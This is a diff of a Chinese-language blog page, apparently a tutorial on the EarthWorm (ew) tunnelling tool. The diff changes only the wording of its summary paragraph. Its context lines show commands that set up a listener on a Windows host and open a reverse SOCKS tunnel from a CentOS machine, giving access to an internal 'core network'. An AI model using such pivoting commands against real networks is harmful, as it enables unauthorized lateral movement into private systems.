@@ -186,7 +186,7 @@
 <p>在win2008上执行,将来自外部的1236端口和本地的3456端口进行绑定<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># ew_for_Win.exe -s lcx_listen -l <span class="number">3456</span> -e <span class="number">1236</span></div></pre></td></tr></table></figure></p>
 <p>在centos 5.1上执行,将本地的socks连接反弹到win2008的1236端口上,此时再回到win2008上看会提示”rssocks cmd_socket OK!”,说明通道已经建立成功<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># ./ew_for_Linux32 -s rssocks -d <span class="number">192.168</span><span class="number">.32</span><span class="number">.170</span> -e <span class="number">1236</span></div></pre></td></tr></table></figure></p>
 <p>最后,再回到win7[vps]上利用Proxifier访问本地的1080就相当于访问centos 5.1的1236端口,即可轻松获取核心网的数据</p>
-<p><br><br>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;关于ew,想必经常搞内网的朋友,已经非常熟练了,这里就不废话了,其实,关于ew本身在实战中还是比较实用的,在此也非常感谢作者的无私贡献,真心希望国内能多一些这样的人,总体来讲,在工具使用上并没有太多技术含量,关键还是要你自己根据目标的实际内网环境仔细弄清楚数据流向再针对性的用,上面一些简单应用场景中,表面看着貌似挺复杂的,其实真正理解以后,都非常简单,深刻搞清楚这些最基本的东西你才有可能灵活应用,什么都是如此,总是停留在’用’别人的工具上,自己没有一点儿的独立分析和想法,是很难有长进的,后续有空会再简单介绍下关于Termite跳板机使用</p>
+<p><br><br>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;关于ew,想必经常搞内网的朋友,都已经非常熟练了,这里也就不废话了,其实,关于ew本身在实战中还是比较实用的,在此也非常感谢作者的无私贡献,真心希望国内能多一些这样的人,总体来讲,在工具使用上并没有太多技术含量,关键还是要你自己根据目标的实际内网环境仔细弄清楚数据流向再针对性的用,上面一些简单应用场景中,表面看着貌似挺复杂的,其实真正理解以后,都非常简单,深刻搞清楚这些最基本的东西你才有可能灵活应用,什么都是如此,总是停留在’用’别人的工具上,自己没有一点儿的独立分析和想法,是很难有长进的,后续有空会再简单介绍下关于Termite跳板机使用</p>
 
     </div>
 
